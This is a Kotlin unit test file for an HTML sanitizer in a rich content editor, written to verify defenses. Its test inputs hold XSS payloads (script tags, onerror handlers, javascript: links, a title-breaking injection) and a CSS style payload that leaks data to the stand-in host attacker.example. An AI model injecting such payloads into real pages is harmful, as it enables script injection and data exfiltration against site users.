/*
 * Copyright (C) 2026 - present Instructure, Inc.
 *
 *     Licensed under the Apache License, Version 2.0 (the "License");
 *     you may not use this file except in compliance with the License.
 *     You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *     Unless required by applicable law or agreed to in writing, software
 *     distributed under the License is distributed on an "AS IS" BASIS,
 *     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *     See the License for the specific language governing permissions and
 *     limitations under the License.
 */
package instructure.rceditor

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class HtmlSanitizerTest {

    @Test
    fun `sanitize strips script tags`() {
        val input = "Hello <script>alert('xss')</script> world"
        val output = HtmlSanitizer.sanitize(input)
        assertFalse(output.contains("<script"))
        assertFalse(output.contains("alert"))
    }

    @Test
    fun `sanitize strips inline event handlers`() {
        val input = "<img src=\"https://example.com/a.png\" onerror=\"alert(1)\" />"
        val output = HtmlSanitizer.sanitize(input)
        assertFalse(output.contains("onerror"))
        assertTrue(output.contains("<img"))
    }

    @Test
    fun `sanitize strips javascript URL scheme on anchors`() {
        val input = "<a href=\"javascript:alert(1)\">click</a>"
        val output = HtmlSanitizer.sanitize(input)
        assertFalse(output.contains("javascript:"))
    }

    @Test
    fun `sanitize preserves iframe with https src for LTI embeds`() {
        val input = "<iframe src=\"https://tool.example.com/launch\" width=\"640\" height=\"480\"></iframe>"
        val output = HtmlSanitizer.sanitize(input)
        assertTrue(output.contains("<iframe"))
        assertTrue(output.contains("src=\"https://tool.example.com/launch\""))
    }

    @Test
    fun `sanitize preserves MathML tags`() {
        val input = "<math><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math>"
        val output = HtmlSanitizer.sanitize(input)
        assertTrue(output.contains("<math"))
        assertTrue(output.contains("<mi"))
        assertTrue(output.contains("<mn"))
    }

    @Test
    fun `sanitize strips inline style attributes to block CSS-based exfiltration and clickjacking`() {
        val input = "<div style=\"background:url(https://attacker.example/?leak);position:fixed;top:0;left:0;width:100%;height:100%\">x</div>"
        val output = HtmlSanitizer.sanitize(input)
        assertFalse(output.contains("style"))
        assertFalse(output.contains("attacker.example"))
        assertFalse(output.contains("position:fixed"))
    }

    @Test
    fun `sanitize preserves common rich-content tags from relaxed safelist`() {
        val input = "<p><strong>Bold</strong> and <em>italic</em> with <a href=\"https://x.test\">link</a></p>"
        val output = HtmlSanitizer.sanitize(input)
        assertTrue(output.contains("<strong"))
        assertTrue(output.contains("<em"))
        assertTrue(output.contains("href=\"https://x.test\""))
    }

    @Test
    fun `sanitize returns empty string for null input`() {
        assertEquals("", HtmlSanitizer.sanitize(null))
    }

    @Test
    fun `sanitize returns empty string for empty input`() {
        assertEquals("", HtmlSanitizer.sanitize(""))
    }

    // escapeForHtmlContext

    @Test
    fun `escapeForHtmlContext escapes title-breaking content`() {
        val input = "</title><script>alert(1)</script>"
        val output = HtmlSanitizer.escapeForHtmlContext(input)
        assertFalse(output.contains("</title>"))
        assertFalse(output.contains("<script>"))
        assertTrue(output.contains("&lt;"))
    }

    @Test
    fun `escapeForHtmlContext escapes both ampersand and angle brackets`() {
        val output = HtmlSanitizer.escapeForHtmlContext("a < b && c > d")
        assertTrue(output.contains("&lt;"))
        assertTrue(output.contains("&gt;"))
        assertTrue(output.contains("&amp;"))
    }

    @Test
    fun `escapeForHtmlContext returns empty string for null input`() {
        assertEquals("", HtmlSanitizer.escapeForHtmlContext(null))
    }
}
